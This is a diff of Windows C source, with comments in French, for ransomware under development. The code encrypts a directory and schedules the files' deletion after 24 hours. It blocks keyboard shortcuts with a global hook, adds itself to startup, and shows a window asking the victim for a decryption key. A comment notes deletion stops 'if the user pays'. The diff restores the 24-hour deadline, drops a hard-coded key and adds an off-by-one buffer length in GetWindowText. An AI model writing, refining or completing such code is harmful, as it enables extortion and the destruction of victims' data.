@@ -13,14 +13,13 @@ time_t end_time;
 HHOOK hKeyboardHook; // Hook global pour bloquer les raccourcis clavier
 HWND hInputBox = NULL; // Champ d'entrée
 HWND hSubmitButton = NULL; // Bouton "Valider"
-const char *expected_key = "0123456789abcdef0123456789abcdef"; // La clé de déchiffrement attendue
 
 
 // Prototypes
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
 void perform_encryption(const char *directory, unsigned char *key, unsigned char *iv);
-void perform_decryption(const char *directory, unsigned char *key, unsigned char *iv);
+int perform_decryption(const char *directory, unsigned char *key, unsigned char *iv);
 void add_to_startup(const char *exe_path);
 
 // Fonction principale
@@ -107,15 +106,15 @@ void perform_encryption(const char *directory, unsigned char *key, unsigned char
     
     // Lance le timer pour supprimer le repertoire au bout de 24 h
     int wait_time_seconds = 24 * 60* 60; // Délai de 24 heures 
-    wait_time_seconds = 5; // Délai de 5 secondes pour les tests // Todo
+    // wait_time_seconds = 5; // Délai de 5 secondes pour les tests // Todo
     printf("Le fichier sera supprimé dans %d secondes.\n", wait_time_seconds); 
     // Appel de la fonction pour planifier la suppression du fichier
     scheduleFileDeletion(directory, wait_time_seconds);
 }
 
 // Fonction de déchiffrement
-void perform_decryption(const char *directory, unsigned char *key, unsigned char *iv) {
-    read_and_crypt_directory(directory, 1, key, iv);
+int perform_decryption(const char *directory, unsigned char *key, unsigned char *iv) {
+    return read_and_crypt_directory(directory, 1, key, iv);
     // Pas la peine d'arreter le scheduleFileDeletion, il s'arretera à la fin du programme si l'utilisateur paye
 }
 
@@ -153,16 +152,15 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                         710, 400, 100, 30, hwnd, (HMENU)3, (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), NULL);
                 }
             } else if (LOWORD(wParam) == 3) { // Bouton "Valider" cliqué
-                char entered_key[256];
-                GetWindowText(hInputBox, entered_key, sizeof(entered_key)); // Récupérer la clé saisie
+                char entered_key[KEY_SIZE];
+                GetWindowText(hInputBox, entered_key, sizeof(entered_key)+1); // Récupérer la clé saisie
 
                 // Vérifier si la clé est correcte
-                if (strcmp(entered_key, expected_key) == 0) {
-                    perform_decryption(directory, key, iv);
+                if (perform_decryption(directory, entered_key, iv) == 0) {  
                     MessageBox(hwnd, "Fichiers déchiffrés avec succès !", "Succès", MB_OK | MB_ICONINFORMATION);
                     PostQuitMessage(0); // Quitter le programme
                 } else {
-                    MessageBox(hwnd, "Clé incorrecte. Veuillez réessayer.", "Erreur", MB_OK | MB_ICONERROR);
+                    MessageBox(hwnd, "Clé incorrecte. Veuillez réessayer.", "Erreur", MB_OK | MB_ICONERROR);  
                 }
             }
             break;
